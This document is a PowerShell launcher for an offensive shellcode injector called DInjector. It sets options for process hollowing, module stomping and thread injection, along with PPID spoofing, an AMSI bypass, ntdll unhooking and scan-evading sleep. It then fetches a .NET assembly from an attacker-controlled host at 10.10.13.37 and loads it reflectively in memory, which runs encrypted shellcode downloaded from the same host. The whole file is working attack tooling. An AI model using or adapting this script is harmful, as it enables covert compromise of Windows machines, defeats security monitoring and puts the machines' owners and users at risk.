<#
.DESCRIPTION

Module name. Choose from:
  
  "functionpointer",
  "functionpointerunsafe",
  "clipboardpointer",
  "currentthread",
  "currentthreaduuid",
  "remotethread",
  "remotethreaddll",
  "remotethreadview",
  "remotethreadsuspended",
  "remotethreadkernelcb",
  "remotethreadapc",
  "remotethreadcontext",
  "processhollowing",
  "modulestomping"
#>
$A = "currentthread"

# [/sc] lhost
$B = "10.10.13.37"

# [/sc] lport
$C = 80

# injector filename
$D = "DInjector.dll"

# [/sc] encrypted shellcode filename
$E = "enc"

# [/password] password to decrypt the shellcode
$F = "Passw0rd!"

# [/protect] protection value that will be applied to the memory region where the shellcode resides ("RX" / "RWX", used in "currentthread")
$G = "RX"

# [/timeout] timeout for WaitForSingleObject in ms (0 is serve forever, used in "currentthread")
$H = 0

# [/flipSleep] time to sleep with PAGE_NOACCESS on shellcode memory region before thread resuming in ms (0 is disable memory protection flip, used in "currentthread" and "remotethreadsuspended")
$I = 0

# [/image] path to the image of a newly spawned process to inject into (used in "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
# if there're spaces in the image path, replace them with asterisk (*) characters (e.g., C:\Program Files\Mozilla Firefox\firefox.exe -> C:\Program*Files\Mozilla*Firefox\firefox.exe)
$J = "C:\Windows\System32\svchost.exe"

# existing process name to inject into (used in "remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended" and "remotethreadkernelcb")
$K = "notepad"

# parent process name to spoof the original value (use "0" to disable PPID spoofing, used in "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
$L = "explorer"

# [/dll] loaded module (DLL) name to overwrite its .text section for storing the shellcode (used in "remotethreaddll")
$M = "msvcp_win.dll"

# [/stompDll] name of the module (DLL) to stomp (used in "modulestomping")
$N = "xpsservices.dll"

# [/stompExport] exported function name to overwrite (used in "modulestomping")
$O = "DllCanUnloadNow"

# [/sleep] number of seconds (approx.) to sleep before execution to evade potential in-memory scan (for values greater than "60" it will take much longer to sleep)
$P = 0

# [/blockDlls] block 3rd-party DLLs ("True" / "False", used in "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
$Q = "True"

# [/am51] bypass AMSI ("True" / "False")
$R = "True"

# [/unhook] unhook ntdll.dll ("True" / "False")
$S = "False"

# --------------------------------------------------------------------

$methods = @("remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended", "remotethreadkernelcb")
if ($methods.Contains($A)) {
    $K = (Start-Process -WindowStyle Hidden -PassThru $K).Id
}

$methods = @("remotethreadapc", "remotethreadcontext", "processhollowing", "modulestomping")
if ($methods.Contains($A)) {
    try {
        $L = (Get-Process $L -ErrorAction Stop).Id
        # if multiple processes exist with the same name, arbitrary select the first one
        if ($L -is [array]) {
            $L = $L[0]
        }
    }
    catch {
        $L = 0
    }
}

$cmd = "${A} /sc:http://${B}:${C}/${E} /password:${F} /protect:${G} /timeout:${H} /flipSleep:${I} /image:${J} /pid:${K} /ppid:${L} /dll:${M} /stompDll:${N} /stompExport:${O} /sleep:${P} /blockDlls:${Q} /am51:${R} /unhook:${S}"

$data = (IWR -UseBasicParsing "http://${B}:${C}/${D}").Content
$assem = [System.Reflection.Assembly]::Load($data)

$flags = [Reflection.BindingFlags] "Public,NonPublic,Static"

$class = $assem.GetType("DInjector.Detonator", $flags)
$entry = $class.GetMethod("Boom", $flags)

$entry.Invoke($null, (, $cmd))
